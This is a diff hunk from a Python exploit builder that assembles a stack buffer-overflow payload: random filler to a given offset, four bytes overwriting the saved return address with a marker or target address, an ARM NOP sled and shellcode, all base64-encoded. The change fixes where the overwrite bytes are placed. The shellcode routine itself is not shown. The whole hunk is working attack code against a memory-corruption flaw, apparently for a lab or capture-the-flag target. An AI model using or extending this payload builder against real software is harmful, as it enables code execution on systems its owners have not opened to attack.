@@ -40,12 +40,13 @@ SLED = b"\x00\x00\xa0\xe1" * 256   # mov r0,r0
 def build(offset, marker=None, addr=None, sled=0):
     """marker/addr overwrite the saved lr at `offset`; sled is prepended to the shellcode."""
     sc = build_shellcode()
-    filler = bytearray(random.getrandbits(8) for _ in range(offset))
+    filler = bytes(random.getrandbits(8) for _ in range(offset))
+    pc = b""
     if marker is not None:
-        filler[offset - 4:offset] = marker.to_bytes(4, "little")
+        pc = marker.to_bytes(4, "little")
     if addr is not None:
-        filler[offset - 4:offset] = addr.to_bytes(4, "little")
-    return base64.b64encode(bytes(filler) + SLED[:sled] + sc).decode()
+        pc = addr.to_bytes(4, "little")
+    return base64.b64encode(filler + pc + SLED[:sled] + sc).decode()
 
 
 def sha(s):
